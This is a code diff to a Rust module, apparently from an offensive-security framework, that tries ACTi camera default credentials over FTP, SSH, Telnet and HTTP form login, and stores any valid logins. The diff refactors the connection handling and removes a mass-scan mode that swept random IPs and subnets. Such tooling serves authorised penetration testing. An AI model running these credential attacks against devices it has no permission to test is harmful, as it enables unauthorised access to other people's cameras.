@@ -3,10 +3,10 @@ use suppaftp::tokio::AsyncFtpStream;
 use colored::*;
 use ssh2::Session;
 use telnet::{Telnet, Event};
-use std::{net::TcpStream, time::Duration};
+use std::time::Duration;
 use tokio::{join, task};
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
 use crate::utils::url_encode;
-use crate::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};
 
 const DEFAULT_TIMEOUT_SECS: u64 = 10;
 
@@ -69,11 +69,18 @@ pub async fn check_ftp(config: &Config) -> Result<Option<(ServiceType, String, S
         }
 
         let address = normalize_target(&config.target, config.port);
-        match AsyncFtpStream::connect(address).await {
+        let tcp_stream = match crate::utils::network::tcp_connect_str(&address, Duration::from_secs(DEFAULT_TIMEOUT_SECS)).await {
+            Ok(s) => s,
+            Err(e) => {
+                tracing::trace!(target = %config.target, port = config.port, user = %username, "TCP connect failed: {}", e);
+                continue;
+            }
+        };
+        match AsyncFtpStream::connect_with_stream(tcp_stream).await {
             Ok(mut ftp) => {
                 if ftp.login(username, password).await.is_ok() {
                     crate::mprintln!("{}", format!("[+] FTP credentials valid: {}:{}", username, password).green().bold());
-                    let _ = ftp.quit().await;
+                    if let Err(e) = ftp.quit().await { eprintln!("[!] FTP quit failed: {}", e); }
                     let result = Some((ServiceType::Ftp, username.to_string(), password.to_string()));
                     // Respect stop_on_success: if true, stop after first valid credential
                     if config.stop_on_success {
@@ -82,9 +89,12 @@ pub async fn check_ftp(config: &Config) -> Result<Option<(ServiceType, String, S
                     // If false, continue checking but still return first found (for consistency)
                     return Ok(result);
                 }
-                let _ = ftp.quit().await;
+                if let Err(e) = ftp.quit().await { eprintln!("[!] FTP quit failed: {}", e); }
             }
-            Err(_) => continue,
+            Err(e) => {
+                tracing::trace!(target = %config.target, port = config.port, user = %username, "FTP login attempt failed: {}", e);
+                continue;
+            }
         }
     }
 
@@ -104,9 +114,14 @@ pub fn check_ssh_blocking(config: &Config) -> Result<Option<(ServiceType, String
         let address = normalize_target(&config.target, config.port);
         let socket_addr: std::net::SocketAddr = match address.parse() {
             Ok(sa) => sa,
-            Err(_) => continue,
+            Err(e) => {
+                tracing::debug!(addr = %address, "SSH target parse failed: {}", e);
+                continue;
+            }
         };
-        if let Ok(stream) = TcpStream::connect_timeout(&socket_addr, Duration::from_secs(DEFAULT_TIMEOUT_SECS)) {
+        // libssh2 needs a blocking std stream — blocking_tcp_connect honors
+        // `setg src_port` which the raw connect_timeout silently skipped.
+        if let Ok(stream) = crate::utils::network::blocking_tcp_connect(&socket_addr, Duration::from_secs(DEFAULT_TIMEOUT_SECS)) {
             let mut session = Session::new().context("Failed to create SSH session")?;
             session.set_tcp_stream(stream);
             session.handshake().context("SSH handshake failed")?;
@@ -139,19 +154,41 @@ pub fn check_telnet_blocking(config: &Config) -> Result<Option<(ServiceType, Str
         let host = parts[1];
         let port: u16 = parts[0].parse().unwrap_or(23);
 
-        if let Ok(mut telnet) = Telnet::connect((host, port), 500) {
-            let _ = telnet.write(format!("{}\r\n", username).as_bytes());
-            let _ = telnet.write(format!("{}\r\n", password).as_bytes());
+        let socket_addr: std::net::SocketAddr = match format!("{}:{}", host, port).parse() {
+            Ok(sa) => sa,
+            Err(e) => {
+                tracing::debug!(addr = %address, "Telnet target parse failed: {}", e);
+                continue;
+            }
+        };
+        if let Ok(tcp_stream) = crate::utils::network::blocking_tcp_connect(&socket_addr, Duration::from_secs(DEFAULT_TIMEOUT_SECS)) {
+            let mut telnet = Telnet::from_stream(Box::new(tcp_stream), 500);
+            if let Err(e) = telnet.write(format!("{}\r\n", username).as_bytes()) { eprintln!("[!] Write failed: {}", e); }
+            if let Err(e) = telnet.write(format!("{}\r\n", password).as_bytes()) { eprintln!("[!] Write failed: {}", e); }
 
             // Give device time to respond
             std::thread::sleep(Duration::from_millis(500));
 
             if let Ok(Event::Data(buffer)) = telnet.read_timeout(Duration::from_millis(800)) {
                 let response = String::from_utf8_lossy(&buffer);
-                if !response.contains("incorrect") && !response.contains("failed") {
+                // Explicit failure indicators -> auth failed
+                if response.contains("incorrect") || response.contains("failed") {
+                    continue;
+                }
+                // Require a positive indicator of a successful login:
+                // shell prompts ($, #, >, ~) or welcome/session messages.
+                let has_shell_prompt = response.contains('$')
+                    || response.contains('#')
+                    || response.contains('>')
+                    || response.contains('~');
+                let has_welcome = response.contains("Welcome")
+                    || response.contains("Last login");
+                if has_shell_prompt || has_welcome {
                     crate::mprintln!("{}", format!("[+] Telnet credentials valid: {}:{}", username, password).green().bold());
                     return Ok(Some((ServiceType::Telnet, username.to_string(), password.to_string())));
                 }
+                // Otherwise the response is inconclusive (e.g. empty,
+                // connection-closed, re-prompt of "login:") -> treat as failed.
             }
         }
     }
@@ -187,20 +224,44 @@ pub async fn check_http_form(config: &Config) -> Result<Option<(ServiceType, Str
             body.push_str(&format!("{}={}", key, url_encode(val)));
         }
 
-        let res = client
+        // Treat a transient request failure as a retryable/transport error: skip
+        // this credential and continue, mirroring the FTP/SSH/Telnet loops above
+        // instead of `?`-aborting the whole HTTP service check.
+        let res = match client
             .post(&url)
             .header("Content-Type", "application/x-www-form-urlencoded")
             .body(body)
             .send()
             .await
-            .context("[!] Failed to send HTTP form request")?;
-
-        let body = match res.text().await {
-            Ok(t) => t,
-            Err(_) => String::new(),
+        {
+            Ok(r) => r,
+            Err(e) => {
+                tracing::trace!(target = %config.target, port = config.port, user = %username, "HTTP form request failed: {}", e);
+                continue;
+            }
         };
 
-        if !body.contains(">Password<") {
+        let status = res.status();
+
+        // A failed body read is a transport error, NOT evidence of valid creds.
+        // Previously this was mapped to an empty String, which trivially does not
+        // contain the login-form marker and was misreported as a successful login.
+        let body = match crate::utils::network::read_http_body_text_capped(res, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
+            Ok(t) => t,
+            Err(e) => {
+                tracing::trace!(target = %config.target, port = config.port, user = %username, "HTTP form response body read failed: {}", e);
+                continue;
+            }
+        };
+
+        // Require a POSITIVE success signal rather than inferring success from the
+        // mere absence of the ">Password<" login-form token:
+        //  - HTTP status must indicate success/redirect (200 / 3xx login-redirect)
+        //  - the login form must NO LONGER be presented (no LOGIN_PASSWORD field
+        //    and no ">Password<" prompt — both are present on the re-served form)
+        let still_login_form =
+            body.contains(">Password<") || body.contains("LOGIN_PASSWORD");
+        if (status.is_success() || status.is_redirection()) && !still_login_form && !body.is_empty() {
             crate::mprintln!("{}", format!("[+] HTTP credentials valid: {}:{}", username, password).green().bold());
             return Ok(Some((ServiceType::Http, username.to_string(), password.to_string())));
         }
@@ -211,52 +272,18 @@ pub async fn check_http_form(config: &Config) -> Result<Option<(ServiceType, Str
 }
 
 /// Entrypoint for module - parallel checks
-pub async fn run(target: &str) -> Result<()> {
-    // Mass scan mode: random IPs, CIDR subnets, or target file
-    if is_mass_scan_target(target) {
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "ACTi Camera",
-            default_port: 80,
-            state_file: "acti_camera_mass_state.log",
-            default_output: "acti_camera_mass_results.txt",
-            default_concurrency: 200,
-        }, |ip: std::net::IpAddr, port: u16| async move {
-            // Quick port check on HTTP
-            if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
-                return None;
-            }
-            let target_str = ip.to_string();
-            let creds = vec![
-                ("admin", "12345"),
-                ("admin", "123456"),
-                ("Admin", "12345"),
-                ("Admin", "123456"),
-            ];
-            // Try HTTP first (most likely for cameras)
-            let client = crate::utils::build_http_client(Duration::from_secs(5)).ok()?;
-            let url = format!("http://{}:{}/", target_str, port);
-            for (user, pass) in &creds {
-                let resp = client.get(&url)
-                    .basic_auth(user, Some(pass))
-                    .send()
-                    .await
-                    .ok()?;
-                if resp.status().is_success() || resp.status().as_u16() == 301 || resp.status().as_u16() == 302 {
-                    let body = resp.text().await.unwrap_or_default();
-                    if !body.contains("401") && !body.to_lowercase().contains("unauthorized") {
-                        let msg = format!("{}:{}:HTTP:{}:{}", ip, port, user, pass);
-                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
-                        return Some(format!("{}\n", msg));
-                    }
-                }
-            }
-            None
-        }).await;
-    }
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("acti_camera_default requires a single-host target")?;
 
     display_banner();
     crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
     crate::mprintln!();
+
+    let mut outcome = ModuleOutcome::ok();
+    ctx.rate_limit(target).await;
 
     let creds = vec![
         ("admin", "12345"),
@@ -318,18 +345,29 @@ pub async fn run(target: &str) -> Result<()> {
                 "HTTP" => (80, "http"),
                 _ => (0, "unknown"),
             };
-            let _ = crate::cred_store::store_credential(
-                target, svc_port, svc_name, user, pass,
-                crate::cred_store::CredType::Password,
-                "creds/camera/acti/acti_camera_default",
-            ).await;
+            if crate::cred_store::store_credential(crate::cred_store::NewCred {
+                host: target, port: svc_port, service: svc_name, username: user, secret: pass,
+                cred_type: crate::cred_store::CredType::Password,
+                source_module: "creds/camera/acti/acti_camera_default",
+            }).await.is_none() { eprintln!("[!] Failed to store credential"); }
+            outcome.findings.push(Finding {
+                target: target.to_string(),
+                kind: FindingKind::Credential,
+                message: format!("ACTi default credentials valid {}:{} on {} ({}:{})", user, pass, svc_name, target, svc_port),
+                data: Some(serde_json::json!({
+                    "service": svc_name,
+                    "port": svc_port,
+                    "username": user,
+                    "password": pass,
+                })),
+            });
         }
     } else {
         crate::mprintln!();
         crate::mprintln!("{}", "[-] No valid credentials found on any service.".yellow());
     }
 
-    Ok(())
+    Ok(outcome)
 }
 
 pub fn info() -> crate::module_info::ModuleInfo {
@@ -340,5 +378,8 @@ pub fn info() -> crate::module_info::ModuleInfo {
         references: vec![],
         disclosure_date: None,
         rank: crate::module_info::ModuleRank::Normal,
+        default_port: None,
     }
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "camera/acti/acti_camera_default", native);
